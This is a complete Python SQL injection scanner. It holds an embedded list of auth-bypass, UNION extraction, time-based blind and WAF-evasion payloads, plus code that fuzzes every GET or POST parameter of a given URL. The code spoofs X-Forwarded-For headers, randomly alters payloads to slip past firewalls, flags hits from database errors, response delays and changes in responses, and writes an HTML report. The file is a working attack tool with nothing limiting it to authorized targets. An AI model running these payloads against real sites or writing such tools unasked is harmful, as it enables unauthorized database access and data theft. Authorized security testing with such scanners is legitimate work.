import requests
import argparse
import sys
import time
import os
import random
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from difflib import SequenceMatcher

# --- STYLES ---
class Colors:
    HEADER, BLUE, GREEN, FAIL, ENDC = '\033[95m', '\033[94m', '\033[92m', '\033[91m', '\033[0m'
    BOLD, WARNING = '\033[1m', '\033[93m'

# --- EMBEDDED DATABASE (EXTENDED FULL LIST) ---
# This list contains the extensive payloads you provided.
EMBEDDED_PAYLOADS = [
    # --- AUTH BYPASS & LOGIC ---
    "' OR '1'='1", "admin' --", "admin' #", "admin'/*",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#",
    "admin'or 1=1 or ''='", "admin') or ('1'='1",
    "admin') or ('1'='1'--", "admin') or ('1'='1'#",
    "' OR '' = '", "') OR '1'='1",
    "admin\" --", "admin\" #", "admin\"/*",
    "admin\" or \"1\"=\"1", "admin\" or \"1\"=\"1\"--",
    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*",
    "' OR 1=1", '" OR 1=1', "') OR 1=1--", "') OR 'x'='x",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
    
    # --- GENERIC ERROR & SYNTAX BREAKERS ---
    "'", "\"", "')", "'));", "--", "#", "/*…*/", 
    "`", "``", ",", ";", "\\", 
    "' or \"", "-- or # ", 
    "' OR '1", "' OR 1 -- -", 
    "\" OR \"\" = \"", "\" OR 1 = 1 -- -",
    "' OR '' = '", "'='", "'LIKE'", "'=0--+",
    
    # --- UNION BASED (DATA EXTRACTION) ---
    "ORDER BY 1--", "ORDER BY 2--", "ORDER BY 3--", "ORDER BY 4--", "ORDER BY 5--",
    "ORDER BY 6--", "ORDER BY 7--", "ORDER BY 8--", "ORDER BY 9--", "ORDER BY 10--",
    "ORDER BY 1#", "ORDER BY 2#", "ORDER BY 3#", "ORDER BY 10#",
    "1' ORDER BY 1--+", "1' ORDER BY 10--+", 
    "-1' UNION SELECT 1,2,3--+", "' UNION SELECT NULL,NULL,NULL--",
    "UNION ALL SELECT 1,2,3,4,5--", "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
    "UNION ALL SELECT @@VERSION,USER(),3",
    "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "UNION SELECT @@VERSION,SLEEP(5),3",
    "-1 UNION SELECT 1 INTO @,@", "-1 UNION SELECT 1 INTO @,@,@",
    
    # --- TIME BASED (BLIND SQLi) ---
    "SLEEP(5)#", "SLEEP(5)--", "1' OR SLEEP(5)#",
    "';WAITFOR DELAY '0:0:5'--", "pg_sleep(5)--",
    "benchmark(10000000,MD5(1))#", "(select(0)from(select(sleep(5)))v)",
    "1)) or sleep(5)#", "'));waitfor delay '0:0:5'--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
    "sleep(5)#", "1 or sleep(5)#", "\" or sleep(5)#",
    "' or sleep(5)#", "1) or sleep(5)#", "') or sleep(5)='",
    ";waitfor delay '0:0:5'--", ");waitfor delay '0:0:5'--",
    "';waitfor delay '0:0:5'--", "\";waitfor delay '0:0:5'--",
    
    # --- COMPLEX / WAF EVASION ---
    "'/**/OR/**/'1'='1", "1'/**/ORDER/**/BY/**/1--+",
    "%00", "+", "||", "%", "@variable", "@@variable",
    "AND 1=1", "AND 1=0", "AND 1=1--", "AND 1=0--",
    "AND 1=1#", "AND 1=0#", "AND 1=1 AND '%'='",
    "AS INJECTX WHERE 1=1 AND 1=1",
    "WHERE 1=1 AND 1=1", "WHERE 1=1 AND 1=0--"
]

# --- ERROR SIGNATURES ---
DB_ERRORS = {
    "MySQL": ["You have an error in your SQL syntax", "check the manual", "mysql_fetch"],
    "PostgreSQL": ["syntax error at or near", "unterminated quoted string", "pg_query"],
    "MSSQL": ["Unclosed quotation mark", "Incorrect syntax near", "SQL Server"],
    "Oracle": ["ORA-01756", "quoted string not properly terminated"],
    "Generic": ["SQL syntax", "valid MySQL result"]
}

class Scanner:
    def __init__(self, url, data=None, payload_file=None, verbose=False, waf_mode=True):
        self.target_url = url
        # Check if POST data exists, otherwise default to GET
        self.post_data = self.parse_post_data(data) if data else None
        self.method = "POST" if self.post_data else "GET"
        
        self.verbose = verbose
        self.waf_mode = waf_mode
        self.session = requests.Session()
        self.findings = []
        
        # Load Payloads
        if payload_file:
            self.static_payloads = self.load_from_file(payload_file)
        else:
            if self.verbose:
                print(f"{Colors.BLUE}[*] No external file provided. Using INTERNAL EXTENDED LIST ({len(EMBEDDED_PAYLOADS)} payloads).{Colors.ENDC}")
            self.static_payloads = EMBEDDED_PAYLOADS

    def parse_post_data(self, data_str):
        """Converts 'user=admin&pass=123' string to dictionary."""
        return dict(item.split("=") for item in data_str.split("&"))

    def load_from_file(self, filepath):
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip()]
            except: pass
        return EMBEDDED_PAYLOADS

    def get_headers(self):
        agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)']
        return {
            'User-Agent': random.choice(agents),
            'X-Forwarded-For': ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        }

    def tamper(self, payload):
        if self.waf_mode and random.choice([True, False]):
            if " " in payload:
                # WAF Bypass: Random replacement
                return payload.replace(" ", random.choice(["/**/", "+", "%20"]))
        return payload

    def make_request(self, url, params=None, data=None):
        try:
            start = time.time()
            # Send request based on method
            if self.method == "GET":
                resp = self.session.get(url, headers=self.get_headers(), timeout=10)
            else:
                resp = self.session.post(url, data=data, headers=self.get_headers(), timeout=10)
            return resp, (time.time() - start)
        except:
            return None, 0

    def analyze(self, baseline, resp, duration, payload):
        # 1. Time-Based Analysis
        if ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper()) and duration >= 5:
             return True, f"Time-Based (Delay: {duration:.2f}s)"
        # 2. Error-Based Analysis
        for db, errors in DB_ERRORS.items():
            for err in errors:
                if err in resp.text: return True, f"{db} Error Reflection"
        # 3. Boolean/Logic Analysis
        sim = SequenceMatcher(None, baseline.text, resp.text).ratio()
        if sim < 0.90 or (resp.status_code != baseline.status_code):
             return True, f"Behavior Change (Sim: {sim:.2f}, Code: {resp.status_code})"
        return False, None

    def run(self):
        parsed = urlparse(self.target_url)
        
        # Determine target parameters (From URL query or POST data?)
        if self.method == "GET":
            params = parse_qs(parsed.query)
            target_container = params
        else:
            params = self.post_data
            target_container = self.post_data

        if not target_container:
            print(f"{Colors.FAIL}[!] No parameters found to fuzz.{Colors.ENDC}")
            return

        print(f"{Colors.BLUE}[*] Target: {self.target_url} ({self.method}){Colors.ENDC}")
        print(f"{Colors.BLUE}[*] WAF Bypass: {'ON' if self.waf_mode else 'OFF'}{Colors.ENDC}")
        
        # Baseline Request
        if self.method == "GET":
            baseline, _ = self.make_request(self.target_url)
        else:
            baseline, _ = self.make_request(self.target_url, data=self.post_data)

        if not baseline: 
            print(f"{Colors.FAIL}[!] Target unreachable.{Colors.ENDC}")
            return

        # Start Fuzzing Loop
        for param in target_container:
            print(f"\n{Colors.HEADER}>>> Scanning Parameter: {param} ({self.method}){Colors.ENDC}")
            
            # Get original value
            if isinstance(target_container[param], list):
                original = target_container[param][0]
            else:
                original = target_container[param]

            for payload in self.static_payloads:
                final_payload = self.tamper(payload)
                
                # Prepare Injection
                temp_params = target_container.copy()
                
                # Logic: If OR/UNION is present, REPLACE value. Else APPEND.
                if "OR" in payload.upper() or "UNION" in payload.upper():
                    if isinstance(temp_params[param], list): temp_params[param] = [final_payload]
                    else: temp_params[param] = final_payload
                else:
                    if isinstance(temp_params[param], list): temp_params[param] = [original + final_payload]
                    else: temp_params[param] = original + final_payload

                # Send Request
                if self.method == "GET":
                    new_query = urlencode(temp_params, doseq=True)
                    url = urlunparse(parsed._replace(query=new_query))
                    resp, duration = self.make_request(url)
                else:
                    # POST Request
                    resp, duration = self.make_request(self.target_url, data=temp_params)
                
                if resp:
                    vuln, reason = self.analyze(baseline, resp, duration, payload)
                    if vuln:
                        print(f"{Colors.GREEN}[+] VULNERABILITY FOUND!{Colors.ENDC}")
                        print(f"    Payload: {final_payload}")
                        print(f"    Reason: {reason}")
                        self.findings.append({'param': param, 'type': 'Dictionary', 'payload': final_payload, 'reason': reason})
                        break # Stop checking this param to avoid spam

        self.export_report()

    def export_report(self):
        filename = "scan_report.html"
        
        # CSS Styling for the report (Modern Dark Header)
        css_style = """
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                color: #333;
                line-height: 1.6;
                margin: 20px;
            }
            h1 {
                color: #2c3e50;
                text-align: center;
            }
            .metadata {
                margin-bottom: 20px;
                padding: 15px;
                background-color: #f8f9fa;
                border-radius: 5px;
            }
            table {
                width: 100%;
                border-collapse: collapse;
                margin-top: 20px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            th, td {
                padding: 12px 15px;
                text-align: left;
                border-bottom: 1px solid #e3e6f0;
            }
            th {
                background-color: #343a40; /* Dark Header */
                color: #ffffff;
                font-weight: bold;
                text-transform: uppercase;
                font-size: 0.9em;
            }
            tr:hover {
                background-color: #f1f1f1;
            }
            .payload-code {
                font-family: 'Courier New', Courier, monospace;
                background-color: #f4f4f4;
                padding: 2px 4px;
                border-radius: 3px;
                font-size: 0.95em;
            }
        </style>
        """

        html_content = f"""
        <html>
        <head>
            <title>SQL Injection Scan Report</title>
            {css_style}
        </head>
        <body>
            <h1>SQL Injection Scan Report</h1>
            <div class="metadata">
                <p><strong>Target:</strong> {self.target_url}</p>
                <p><strong>Method:</strong> {self.method}</p>
                <p><strong>Date:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                <p><strong>Total Vulnerabilities:</strong> {len(self.findings)}</p>
            </div>
            <table>
                <tr>
                    <th>Parameter</th>
                    <th>Type</th>
                    <th>Payload</th>
                    <th>Detection Reason</th>
                </tr>
        """
        
        for item in self.findings:
            html_content += f"""
                <tr>
                    <td><strong>{item['param']}</strong></td>
                    <td>{item['type']}</td>
                    <td><span class="payload-code">{item['payload']}</span></td>
                    <td>{item['reason']}</td>
                </tr>
            """
        
        html_content += """
            </table>
        </body>
        </html>
        """
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        print(f"\n{Colors.GREEN}[+] HTML Report Generated: {os.path.abspath(filename)}{Colors.ENDC}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--data", help="POST data (e.g., 'user=admin&pass=123')")
    parser.add_argument("-f", "--file", help="External payloads file")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()
    
    print(f"{Colors.HEADER}--- SQL SCANNER (GET/POST & EXTENDED PAYLOADS) ---{Colors.ENDC}")
    scanner = Scanner(args.url, args.data, args.file, args.verbose)
    scanner.run()